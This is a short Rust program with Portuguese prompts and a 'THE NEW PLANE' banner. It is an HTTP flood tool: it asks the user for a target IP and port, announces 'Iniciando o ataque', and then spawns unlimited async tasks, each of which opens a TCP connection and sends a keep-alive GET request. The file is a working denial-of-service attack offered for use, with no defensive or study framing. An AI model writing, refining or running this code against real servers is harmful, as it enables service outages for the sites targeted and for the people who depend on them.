use colored::Colorize;
use std::io::{self, Write};

use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

static mut NUM_REQUISICOES: i32 = 0;

#[tokio::main]
async fn main() -> Result<(), io::Error> {

    let logo = "
████████╗██╗░░██╗███████╗  ███╗░░██╗███████╗░██╗░░░░░░░██╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░██║██╔════╝░██║░░██╗░░██║
░░░██║░░░███████║█████╗░░  ██╔██╗██║█████╗░░░╚██╗████╗██╔╝
░░░██║░░░██╔══██║██╔══╝░░  ██║╚████║██╔══╝░░░░████╔═████║░
░░░██║░░░██║░░██║███████╗  ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░
        ██████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗
        ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝
        ██████╔╝██║░░░░░███████║██╔██╗██║█████╗░░
        ██╔═══╝░██║░░░░░██╔══██║██║╚████║██╔══╝░░
        ██║░░░░░███████╗██║░░██║██║░╚███║███████╗
    ";
    let mut opc = String::new();
    
    println!("{}",logo.red());

    print!("1 - Inundar com requisições\nEscolha uma opção: ");
    io::stdout().flush().unwrap();

    io::stdin().read_line(&mut opc).unwrap();

    let opc: i32 = opc.trim().parse().unwrap();

    if opc == 1 {
        let mut ip_port = String::new();

        print!("\nInsira o IP (IP:PORTA): ");
        io::stdout().flush()?;

        io::stdin().read_line(&mut ip_port).unwrap();

        println!("Iniciando o ataque");
 
        loop {
            let copia_ip = ip_port.trim().to_owned();
            tokio::spawn ( 
                unsafe {
                    async move {
                        inundando_http(copia_ip).await.unwrap();
                        NUM_REQUISICOES += 1; 
                        println!("{}° Requisição", NUM_REQUISICOES);
                    }
                }
            );
        }
    }
    else {
        println!("Opção inválida, tente novamente.");
    }

    Ok(())
}

async fn inundando_http(ip:String) -> Result<(), io::Error>{
    let mut transmissao = TcpStream::connect(format!("{}",ip)).await?;

    let requisicao = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: TheNewPlane/0.1\r\nConnection: keep-alive\r\n\r\n",ip);
    
    transmissao.write_all(requisicao.as_bytes()).await?;
    Ok(())
}
